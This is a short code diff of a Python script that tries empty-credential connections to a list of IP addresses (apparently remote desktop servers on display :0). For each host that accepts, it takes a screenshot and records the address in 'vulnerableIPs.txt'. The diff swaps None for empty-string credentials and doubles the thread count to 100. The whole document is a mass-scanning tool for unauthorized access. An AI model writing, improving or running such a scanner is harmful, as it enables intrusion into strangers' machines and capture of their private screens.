@@ -8,7 +8,7 @@ from filelock import FileLock
 def attemptConnect(ips):
      for ip in ips:
         try:
-            client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username=None, password=None)
+            client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username='', password='')
             client.captureScreen('screenshot_IP_{ip}.png'.format(ip=ip))
             print('Got image from {ip}'.format(ip=ip))
             with FileLock("vulnerableIPs.txt"):
@@ -51,7 +51,7 @@ def main():
                     print("")
             print("Done. Proceeding with screenshotting: ")
 
-            maxThreads = 50
+            maxThreads = 100
             ips_to_multithread = createThread(maxThreads, ips)
 
             for i in range(0, maxThreads):
